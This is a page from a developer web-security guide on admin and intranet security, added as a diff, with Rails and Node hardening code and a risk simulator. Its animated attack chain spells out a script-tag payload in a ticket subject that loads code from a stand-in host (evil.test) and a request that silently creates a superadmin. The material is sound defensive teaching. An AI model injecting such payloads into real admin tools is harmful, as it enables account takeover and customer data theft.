@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en" data-lang="rails">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>18 Intranet and Admin Security · Web Security</title>
+
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="site.webmanifest">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" href="assets/site.css?v=8f1e007517">
+<script src="assets/consent.js?v=9320b4a322"></script>
+</head>
+<body data-slug="18-intranet-and-admin">
+<div class="win">
+  <div class="titlebar"><span class="dots"><i></i><i></i><i></i></span><span class="t">guest@websec: ~/websec/18-intranet-and-admin — zsh — 100×40</span>
+    <a class="by" href="about.html" title="About the author"><span class="w0">by </span>SaKKo</a>
+    <span class="lsw" role="group" aria-label="Language"><a href="18-intranet-and-admin.html" aria-current="true" data-setlang="en">EN</a><a href="th/18-intranet-and-admin.html" data-setlang="th">TH</a></span>
+    <span class="langsw" role="group" aria-label="Code examples language"><span class="d">code:</span><button type="button" data-l="rails">rails</button><button type="button" data-l="node">node</button></span></div>
+  <nav class="top" aria-label="Sections"><a href="index.html" title="Web Security Field Guide">~/</a>
+<a class="trk on" href="index.html#security">#1 security</a>
+<a class="trk" href="r01-rails-api-app.html">#2 rails</a>
+<span class="grp">|</span>
+<a href="01-introduction.html" title="Introduction">01·introduction</a>
+<a href="02-sql-injection.html" title="SQL Injection">02·sql-injection</a>
+<a href="03-unsafe-query-generation.html" title="Unsafe Query Generation">03·query-shape</a>
+<a href="04-xss-and-other-injection.html" title="XSS and Other Injection">04·xss</a>
+<span class="grp">| accounts:</span>
+<a href="05-authentication.html" title="Authentication">05·auth</a>
+<a href="05b-mfa.html" title="Multi-Factor Authentication">05b·mfa</a>
+<a href="06-sessions.html" title="Sessions">06·sessions</a>
+<a href="07-csrf.html" title="Cross-Site Request Forgery">07·csrf</a>
+<a href="08-user-management.html" title="User Management">08·accounts</a>
+<a href="09-mass-assignment-and-authorization.html" title="Mass Assignment and Authorization">09·authz</a>
+<span class="grp">| browser:</span>
+<a href="10-redirection-and-files.html" title="Redirection and Files">10·files</a>
+<a href="11-http-security-headers.html" title="HTTP Security Headers">11·headers</a>
+<a href="12-transport-cookies-third-party.html" title="Transport, Cookies and Third-Party Scripts">12·cookies-tls</a>
+<span class="grp">| server:</span>
+<a href="13-ssrf.html" title="Server-Side Request Forgery">13·ssrf</a>
+<a href="14-deserialization-and-xxe.html" title="Deserialization and XXE">14·deserialize</a>
+<a href="15-environmental-security.html" title="Environmental Security">15·secrets</a>
+<a href="16-cryptography.html" title="Cryptography and Data Protection">16·crypto</a>
+<a href="17-dependencies-and-cves.html" title="Dependencies and CVEs">17·dependencies</a>
+<span class="grp">| ops:</span>
+<a href="18-intranet-and-admin.html" aria-current="page" title="Intranet and Admin Security">18·admin</a>
+<a href="19-misconfiguration-and-errors.html" title="Misconfiguration and Error Handling">19·misconfig</a>
+<a href="20-insecure-design.html" title="Insecure Design and Business Logic">20·design</a>
+<a href="21-logging-and-incident-response.html" title="Logging, Alerting and Incident Response">21·logging</a>
+<a href="22-additional-resources.html" title="Additional Resources">22·resources</a>
+<span class="grp">| questionnaires:</span>
+<a href="q1-developer-survey.html" title="Developer Security Survey">Q1·developer</a>
+<a href="q2-awareness-survey.html" title="Cyber Threat Awareness Survey">Q2·cyber</a></nav>
+  <main>
+<div class="col">
+<p class="prompt">guest@websec ~ % <b>man 18-intranet-and-admin</b></p>
+<h1>18 · Intranet and Admin Security</h1>
+<p class="lede">Admin tools hold the most power, get built fastest, and get reviewed least. Attackers know. Take over one admin and you have every user.</p>
+<h2>Why admin interfaces are special</h2>
+<p>Admin screens can do everything, and they display stuff the public typed in: tickets, profiles, filenames. Perfect for XSS.</p>
+<p>"Internal" isn't a wall. Staff browsers also read email and browse the web.</p>
+<h2>18.1 Cross-site scripting in admin tools</h2>
+<p>One unescaped field in an admin page is enough. The script runs as the admin and can quietly create a new admin.</p>
+<div class="anim" data-actors="Attacker|Public site|Admin app|Support agent" data-title="From support ticket to full takeover"><script type="application/json">[{"f": 0, "t": 1, "l": "ticket subject: Refund <script src=//evil.test/a.js>", "k": "a", "c": "The public site escapes it correctly, so nothing happens there."}, {"f": 3, "t": 2, "l": "GET /admin/tickets", "c": "An agent opens the ticket queue in the internal admin tool."}, {"f": 2, "t": 3, "l": "<td><%= raw ticket.subject %><\/td>", "k": "a", "c": "The admin view was built quickly and renders the subject unescaped."}, {"n": 3, "l": "a.js runs with the agent's session", "k": "a", "c": "The script runs on <code>admin.example.com<\/code>. It can read the CSRF token from the page, so tokens don't help."}, {"f": 3, "t": 2, "l": "POST /admin/users {role: superadmin, email: backup@evil.test}", "k": "a", "c": "It creates a new superadmin silently."}, {"f": 0, "t": 2, "l": "log in as backup@evil.test → export all customers", "k": "a", "c": "<b>Full compromise.<\/b> The audit log blames the agent."}, {"n": 2, "l": "escaped views + CSP + re-auth for role changes + alert on new admins", "k": "k", "c": "Any one of these breaks the chain. Escaping is the real fix; the rest limit the damage."}]</script></div>
+<p>Same fixes as section 04, applied <b>just as strictly</b> to internal tools.</p>
+<h2>18.2 Cross-site request forgery against admins</h2>
+<p>CSRF against an admin can do anything the admin can. Real example: a web page that silently changed people's home router settings.</p>
+<p>Same defenses as section 07. Never turn CSRF off "because it's internal".</p>
+<h2>18.3 Additional precautions</h2>
+<p>Plan for the day an admin account gets taken:</p>
+<div class="demo"><header><b>sim: admin hardening</b><span>an attacker gets an agent's session; how far can they go?</span></header><div class="body">
+<div class="grid2">
+<div id="ad-opts" style="display:grid;gap:6px"></div>
+<div><p class="cap">blast radius</p><div class="meter"><span id="ad-bar"></span></div><div class="out" id="ad-out" style="margin-top:10px"></div></div>
+</div>
+</div></div>
+<ul>
+<li><b>Roles.</b> Support doesn't need finance powers. Check on the server, every time.</li>
+<li><b>Separate admin logins</b> with passkeys or security keys.</li>
+<li><b>Ask again</b> before dangerous actions like exports or role changes.</li>
+<li><b>VPN or office network only.</b></li>
+<li><b>Own subdomain</b>, like <code>admin.example.com</code>, so public-site XSS can't reach admin cookies.</li>
+<li><b>Audit log + alerts</b> on every privileged action.</li>
+</ul>
+<div class="rp no">Nothing built in. Admin gems escape output, but roles, IP limits, re-auth and audit logs are ours (try <code>pundit</code> and <code>audited</code>).</div>
+<div class="code">
+<pre data-lang="rails"><span class="c"># config/routes.rb: admin only on its own host</span>
+constraints(host: "admin.example.com") do
+  namespace :admin do
+    resources :users
+  end
+end
+
+class Admin::BaseController &lt; ApplicationController
+  ADMIN_NET = IPAddr.new("10.0.0.0/8")             <span class="c"># VPN range (trust your proxy config)</span>
+  before_action { head :forbidden unless ADMIN_NET.include?(request.remote_ip) }
+  before_action :require_admin_session!            <span class="c"># separate admin login + MFA</span>
+  content_security_policy { |p| p.default_src :self; p.script_src :self }
+end
+
+class Admin::RolesController &lt; Admin::BaseController
+  before_action -&gt; { require_recent_auth!(5.minutes) }   <span class="c"># your helper: re-prompt</span>
+  def update
+    user = User.find(params[:user_id])
+    authorize user, :change_role?                  <span class="c"># Pundit policy</span>
+    user.update!(role: params.require(:role))
+    AuditLog.create!(actor: Current.admin, action: "role_change", target: user)
+  end
+end</pre>
+<pre data-lang="node"><span class="c">// Express: lock the admin router down in layers</span>
+const admin = express.Router();
+admin.use(requireNetwork(["10.0.0.0/8"]));          <span class="c">// VPN range (behind a trusted proxy)</span>
+admin.use(requireAdminSession);                       <span class="c">// separate admin login + MFA</span>
+admin.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: ["'self'"] } }));
+
+admin.post("/users/:id/role", requireRole("superadmin"), requireRecentAuth(5 * 60),
+  async (req, res) =&gt; {
+    await audit.log(req.admin.id, "role_change", req.params.id, req.body.role);
+    …
+  });
+app.use(vhost("admin.example.com", admin));            <span class="c">// separate host</span></pre>
+</div>
+</div>
+
+<div class="col"><label class="readmark"><input type="checkbox" id="read-18-intranet-and-admin"> mark section 18 as read</label><div class="pager"><a href="17-dependencies-and-cves.html">◀ 17 Dependencies and CVEs</a><a href="19-misconfiguration-and-errors.html">19 Misconfiguration and Error Handling ▶</a></div></div>
+  </main>
+  <footer class="site">Based on the <a href="https://guides.rubyonrails.org/security.html">Ruby on Rails Security Guide</a> (CC BY-SA 4.0), the <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>, the <a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> and <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla's Web Security Guidelines</a>. Written for our dev team; code samples are illustrative.</footer>
+</div>
+<script src="assets/site.js?v=92ac7aa3f8"></script>
+<script>
+
+const opts = [
+  ["rbac", "role-based permissions (agent ≠ superadmin)", 25, "can't create admins or change payouts with an agent's role"],
+  ["sep", "separate admin credentials + security-key MFA", 15, "phished personal password doesn't open the admin"],
+  ["step", "re-auth for dangerous actions", 15, "export / role changes prompt for MFA again"],
+  ["net", "admin only reachable via VPN / IP allowlist", 15, "stolen cookie useless from attacker's network"],
+  ["sub", "admin on its own subdomain", 10, "public-site XSS can't read admin cookies"],
+  ["csp", "strict CSP + escaped templates in admin", 10, "injected ticket script doesn't run"],
+  ["audit", "audit log + alerts on privileged actions", 10, "takeover detected within minutes"]];
+$("#ad-opts").innerHTML = opts.map(o => `<label><input type="checkbox" id="ad-${o[0]}"> ${o[1]}</label>`).join("");
+function ad() {
+  let risk = 100; const on = [], off = [];
+  opts.forEach(o => { if ($("#ad-" + o[0]).checked) { risk -= o[2]; on.push(o[3]); } else off.push(o[1]); });
+  $("#ad-bar").style.width = risk + "%"; $("#ad-bar").style.background = risk > 60 ? "var(--red)" : risk > 25 ? "var(--yellow)" : "var(--fg)";
+  const level = risk > 60 ? '<span class="r">full compromise: data export, new superadmin, payouts redirected</span>' : risk > 25 ? '<span class="y">partial: attacker limited to the agent\'s permissions, some actions blocked</span>' : '<span class="g">contained: little can be done with the stolen session, and you\'ll know about it</span>';
+  $("#ad-out").innerHTML = `${level}\n\n` + on.map(s => '<span class="g">+ ' + s + "</span>").join("\n");
+}
+$$("#ad-opts input").forEach(i => i.addEventListener("change", ad)); ad();
+
+</script>
+</body>
+</html>
